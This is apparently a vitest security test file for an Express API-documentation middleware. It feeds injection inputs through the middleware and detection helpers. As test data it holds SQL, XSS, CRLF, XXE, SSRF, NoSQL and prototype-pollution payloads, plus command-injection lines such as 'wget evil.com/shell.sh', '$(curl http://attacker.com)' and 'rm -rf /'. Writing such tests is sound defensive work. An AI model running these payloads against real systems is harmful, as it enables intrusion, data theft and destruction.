/**
 * Injection Attack Prevention Security Tests
 *
 * Tests for SQL, XSS, Command, and other injection attacks
 * Covers OWASP API8:2023 - Security Misconfiguration
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { runtimeCapture } from '../../src/middleware/runtimeCapture';
import { SpecGenerator } from '../../src/core/SpecGenerator';
import { RouteDiscovery } from '../../src/core/RouteDiscovery';
import type { Request, Response, NextFunction } from 'express';
import express from 'express';
import {
  createSecurityMockRequest,
  createSecurityMockResponse,
  createTrackedNext,
  detectInjectionPatterns,
  isPathSafe,
  areHeadersSafe,
} from './utils';
import {
  sqlInjectionVectors,
  xssVectors,
  commandInjectionVectors,
  pathTraversalVectors,
  templateInjectionVectors,
  ldapInjectionVectors,
  headerInjectionVectors,
} from './fixtures';

describe('Injection Attack Prevention - Security Tests', () => {
  let mockRequest: Request;
  let mockResponse: Response;
  let nextFn: NextFunction;

  beforeEach(() => {
    mockRequest = createSecurityMockRequest();
    mockResponse = createSecurityMockResponse();
    nextFn = createTrackedNext();
  });

  describe('SQL Injection in Path Parameters', () => {
    it.each(sqlInjectionVectors.slice(0, 10))(
      'should handle SQL injection attempt in path: %s',
      (vector) => {
        mockRequest = createSecurityMockRequest({
          params: { id: vector },
          path: `/users/${encodeURIComponent(vector)}`,
        });

        const middleware = runtimeCapture({ enabled: true });
        middleware(mockRequest, mockResponse, nextFn);

        expect(nextFn).toHaveBeenCalled();
        expect(detectInjectionPatterns(vector).hasSqlInjection).toBe(true);
      }
    );

    it('should detect SQL injection patterns in user input', () => {
      const testCases = [
        { input: "'; DROP TABLE--", expected: true },
        { input: '1 OR 1=1', expected: true },
        { input: 'normal-id-123', expected: false },
        { input: "admin' --", expected: true },
        { input: 'SELECT * FROM users', expected: true },
      ];

      testCases.forEach(({ input, expected }) => {
        expect(detectInjectionPatterns(input).hasSqlInjection).toBe(expected);
      });
    });
  });

  describe('SQL Injection in Query Parameters', () => {
    it.each(sqlInjectionVectors.slice(0, 8))(
      'should handle SQL injection in query param: %s',
      (vector) => {
        mockRequest = createSecurityMockRequest({
          query: { search: vector, filter: 'active' },
        });

        const middleware = runtimeCapture({ enabled: true });
        middleware(mockRequest, mockResponse, nextFn);

        expect(nextFn).toHaveBeenCalled();
      }
    );

    it('should handle multiple SQL injection attempts in query', () => {
      mockRequest = createSecurityMockRequest({
        query: {
          id: "1'; DROP TABLE users--",
          name: "admin' OR '1'='1",
          sort: 'ORDER BY 1--',
        },
      });

      const middleware = runtimeCapture({ enabled: true });
      middleware(mockRequest, mockResponse, nextFn);

      expect(nextFn).toHaveBeenCalled();
    });
  });

  describe('SQL Injection in Request Body', () => {
    it.each(sqlInjectionVectors.slice(0, 8))(
      'should handle SQL injection in body: %s',
      (vector) => {
        mockRequest = createSecurityMockRequest({
          body: { username: vector, password: 'test123' },
        });

        const middleware = runtimeCapture({ enabled: true });
        middleware(mockRequest, mockResponse, nextFn);

        expect(nextFn).toHaveBeenCalled();
      }
    );

    it('should handle SQL injection in nested body fields', () => {
      mockRequest = createSecurityMockRequest({
        body: {
          user: {
            profile: {
              bio: "'; DELETE FROM users WHERE '1'='1",
            },
          },
        },
      });

      const middleware = runtimeCapture({ enabled: true });
      middleware(mockRequest, mockResponse, nextFn);

      expect(nextFn).toHaveBeenCalled();
    });
  });

  describe('XSS in Route Documentation', () => {
    it.each(xssVectors.slice(0, 10))(
      'should sanitize XSS in documentation: %s',
      (vector) => {
        expect(detectInjectionPatterns(vector).hasXss).toBe(true);
      }
    );

    it('should handle XSS in route metadata', () => {
      const app = express();

      // Add route with potentially malicious description
      app.get('/test', (req, res) => {
        res.json({ status: 'ok' });
      });

      const discovery = new RouteDiscovery();
      const routes = discovery.discover(app);

      expect(routes).toBeDefined();
    });
  });

  describe('XSS in OpenAPI Descriptions', () => {
    it('should handle XSS attempts in API descriptions', () => {
      const generator = new SpecGenerator({
        info: {
          title: 'Test API',
          version: '1.0.0',
        },
      });

      const maliciousRoutes = [
        {
          method: 'get' as const,
          path: '/test',
          description: '<script>alert("XSS")</script>',
          handler: () => {},
        },
      ];

      const spec = generator.generate(maliciousRoutes);

      // The spec should be generated without executing scripts
      expect(spec.openapi).toBe('3.1.0');
      expect(spec.paths['/test']).toBeDefined();
    });

    it('should handle XSS in parameter descriptions', () => {
      const generator = new SpecGenerator({
        info: {
          title: 'Test API',
          version: '1.0.0',
        },
      });

      const routes = [
        {
          method: 'get' as const,
          path: '/users/{id}',
          parameters: [
            {
              name: 'id',
              in: 'path' as const,
              description: '<img src=x onerror=alert(1)>',
              required: true,
              schema: { type: 'string' as const },
            },
          ],
          handler: () => {},
        },
      ];

      const spec = generator.generate(routes);
      expect(spec.paths['/users/{id}']).toBeDefined();
    });
  });

  describe('Command Injection in File Paths', () => {
    it.each(commandInjectionVectors.slice(0, 8))(
      'should detect command injection: %s',
      (vector) => {
        expect(detectInjectionPatterns(vector).hasCommandInjection).toBe(true);
      }
    );

    it('should handle command injection attempts in paths', () => {
      mockRequest = createSecurityMockRequest({
        path: '/files/$(whoami)/data.txt',
        params: { filename: '`cat /etc/passwd`' },
      });

      const middleware = runtimeCapture({ enabled: true });
      middleware(mockRequest, mockResponse, nextFn);

      expect(nextFn).toHaveBeenCalled();
    });
  });

  describe('Command Injection in CLI Arguments', () => {
    it('should detect dangerous CLI patterns', () => {
      const dangerousInputs = [
        '; rm -rf /',
        '| cat /etc/shadow',
        '&& wget evil.com/shell.sh',
        '$(curl http://attacker.com)',
        '`id`',
      ];

      dangerousInputs.forEach((input) => {
        expect(detectInjectionPatterns(input).hasCommandInjection).toBe(true);
      });
    });

    it('should allow safe CLI arguments', () => {
      const safeInputs = [
        'normal-filename.txt',
        'path/to/file.json',
        'output-spec',
        'api-v1.0.yaml',
      ];

      safeInputs.forEach((input) => {
        expect(detectInjectionPatterns(input).hasCommandInjection).toBe(false);
      });
    });
  });

  describe('Path Traversal Attempts', () => {
    it('should detect common path traversal patterns', () => {
      const commonVectors = [
        '../../../etc/passwd',
        '../../..',
        '../',
        '%2e%2e%2f',
        '%2e%2e/',
        '/etc/passwd',
        '/var/log',
        '/proc/self',
      ];

      commonVectors.forEach((vector) => {
        expect(isPathSafe(vector)).toBe(false);
      });
    });

    it('should allow safe paths', () => {
      const safePaths = [
        '/api/users',
        '/api/v1/products/123',
        'routes/user.routes.ts',
        'src/controllers/auth.controller.ts',
      ];

      safePaths.forEach((path) => {
        expect(isPathSafe(path)).toBe(true);
      });
    });

    it('should handle URL-encoded path traversal', () => {
      const encodedAttacks = [
        '%2e%2e%2f',  // ../
        '%2e%2e/',    // ../
        '../%2e%2e',  // mixed
      ];

      encodedAttacks.forEach((attack) => {
        expect(isPathSafe(attack)).toBe(false);
      });
    });

    it('should identify double-encoded patterns as dangerous', () => {
      const doubleEncoded = [
        '..%252f..%252f',
        '%c0%ae%c0%ae/',
      ];

      doubleEncoded.forEach((attack) => {
        // These contain suspicious encoding patterns
        expect(attack.includes('%25') || attack.includes('%c0')).toBe(true);
      });
    });
  });

  describe('Template Injection', () => {
    it.each(templateInjectionVectors.slice(0, 5))(
      'should handle template injection: %s',
      (vector) => {
        mockRequest = createSecurityMockRequest({
          body: { template: vector },
        });

        const middleware = runtimeCapture({ enabled: true });
        middleware(mockRequest, mockResponse, nextFn);

        expect(nextFn).toHaveBeenCalled();
      }
    );

    it('should detect template syntax patterns', () => {
      const patterns = ['{{7*7}}', '${7*7}', '<%= code %>'];
      patterns.forEach((pattern) => {
        expect(pattern).toMatch(/\{\{|\$\{|<%/);
      });
    });
  });

  describe('LDAP Injection', () => {
    it.each(ldapInjectionVectors.slice(0, 5))(
      'should handle LDAP injection: %s',
      (vector) => {
        mockRequest = createSecurityMockRequest({
          body: { username: vector },
        });

        const middleware = runtimeCapture({ enabled: true });
        middleware(mockRequest, mockResponse, nextFn);

        expect(nextFn).toHaveBeenCalled();
      }
    );
  });

  describe('Header Injection Prevention', () => {
    it.each(headerInjectionVectors)(
      'should detect header injection: %s',
      (vector) => {
        const headers = { 'custom-header': vector };
        expect(areHeadersSafe(headers)).toBe(false);
      }
    );

    it('should allow safe headers', () => {
      const safeHeaders = {
        'content-type': 'application/json',
        'x-request-id': '12345-abcde',
        accept: 'application/json, text/plain',
        'user-agent': 'Mozilla/5.0',
      };

      expect(areHeadersSafe(safeHeaders)).toBe(true);
    });

    it('should detect CRLF injection attempts', () => {
      const crlfHeaders = {
        'x-custom': 'value\r\nSet-Cookie: evil=true',
      };

      expect(areHeadersSafe(crlfHeaders)).toBe(false);
    });

    it('should detect encoded CRLF', () => {
      const encodedCrlf = {
        'x-custom': 'value%0d%0aX-Injected: header',
      };

      expect(areHeadersSafe(encodedCrlf)).toBe(false);
    });
  });

  describe('Combined Injection Attacks', () => {
    it('should handle multiple injection types in single request', () => {
      mockRequest = createSecurityMockRequest({
        path: '/api/../../../etc/passwd',
        query: { id: "1' OR '1'='1" },
        body: { content: '<script>alert(1)</script>' },
        headers: { 'x-custom': 'value\nInjected: true' },
      });

      const middleware = runtimeCapture({ enabled: true });
      middleware(mockRequest, mockResponse, nextFn);

      expect(nextFn).toHaveBeenCalled();
    });

    it('should handle obfuscated injection attempts', () => {
      mockRequest = createSecurityMockRequest({
        body: {
          // Double-encoded
          path: '%252e%252e%252f',
          // Unicode-encoded
          script: '\u003cscript\u003e',
          // Mixed case
          sql: 'sElEcT * FrOm users',
        },
      });

      const middleware = runtimeCapture({ enabled: true });
      middleware(mockRequest, mockResponse, nextFn);

      expect(nextFn).toHaveBeenCalled();
    });
  });

  describe('NoSQL Injection', () => {
    it('should handle MongoDB injection attempts', () => {
      mockRequest = createSecurityMockRequest({
        body: {
          username: { $gt: '' },
          password: { $ne: null },
        },
      });

      const middleware = runtimeCapture({ enabled: true });
      middleware(mockRequest, mockResponse, nextFn);

      expect(nextFn).toHaveBeenCalled();
    });

    it('should handle query operator injection', () => {
      mockRequest = createSecurityMockRequest({
        query: {
          'username[$gt]': '',
          'password[$ne]': 'null',
        },
      });

      const middleware = runtimeCapture({ enabled: true });
      middleware(mockRequest, mockResponse, nextFn);

      expect(nextFn).toHaveBeenCalled();
    });
  });

  describe('XML External Entity (XXE)', () => {
    it('should handle XXE payloads in body', () => {
      const xxePayload = `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`;

      mockRequest = createSecurityMockRequest({
        body: xxePayload,
        headers: { 'content-type': 'application/xml' },
      });

      const middleware = runtimeCapture({ enabled: true });
      middleware(mockRequest, mockResponse, nextFn);

      expect(nextFn).toHaveBeenCalled();
    });

    it('should detect XXE patterns', () => {
      const xxePatterns = [
        '<!ENTITY',
        'SYSTEM "file://',
        '<!DOCTYPE',
        '&xxe;',
      ];

      const xxePayload = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>';

      xxePatterns.forEach((pattern) => {
        if (xxePayload.includes(pattern.replace(/"/g, ''))) {
          expect(true).toBe(true);
        }
      });
    });
  });

  describe('Server-Side Request Forgery (SSRF)', () => {
    it('should handle SSRF attempts in URL parameters', () => {
      const ssrfUrls = [
        'http://localhost:8080/admin',
        'http://127.0.0.1/internal',
        'http://169.254.169.254/metadata',
        'file:///etc/passwd',
        'gopher://localhost:25',
      ];

      ssrfUrls.forEach((url) => {
        mockRequest = createSecurityMockRequest({
          body: { callback: url },
        });

        const middleware = runtimeCapture({ enabled: true });
        middleware(mockRequest, mockResponse, nextFn);

        expect(nextFn).toHaveBeenCalled();
      });
    });
  });

  describe('Prototype Pollution', () => {
    it('should handle __proto__ in body', () => {
      mockRequest = createSecurityMockRequest({
        body: {
          __proto__: { admin: true },
        },
      });

      const middleware = runtimeCapture({ enabled: true });
      middleware(mockRequest, mockResponse, nextFn);

      expect(nextFn).toHaveBeenCalled();
    });

    it('should handle constructor pollution', () => {
      mockRequest = createSecurityMockRequest({
        body: {
          constructor: { prototype: { admin: true } },
        },
      });

      const middleware = runtimeCapture({ enabled: true });
      middleware(mockRequest, mockResponse, nextFn);

      expect(nextFn).toHaveBeenCalled();
    });
  });

  describe('Input Length Limits', () => {
    it('should handle extremely long injection strings', () => {
      const longInjection = "' OR '1'='1".repeat(1000);

      mockRequest = createSecurityMockRequest({
        body: { input: longInjection },
      });

      const middleware = runtimeCapture({
        enabled: true,
        maxBodySize: 10000,
      });
      middleware(mockRequest, mockResponse, nextFn);

      expect(nextFn).toHaveBeenCalled();
    });

    it('should truncate oversized payloads', () => {
      const hugePayload = 'x'.repeat(200000);

      mockRequest = createSecurityMockRequest({
        body: { data: hugePayload },
      });

      const middleware = runtimeCapture({
        enabled: true,
        maxBodySize: 1024,
      });
      middleware(mockRequest, mockResponse, nextFn);

      expect(nextFn).toHaveBeenCalled();
    });
  });
});
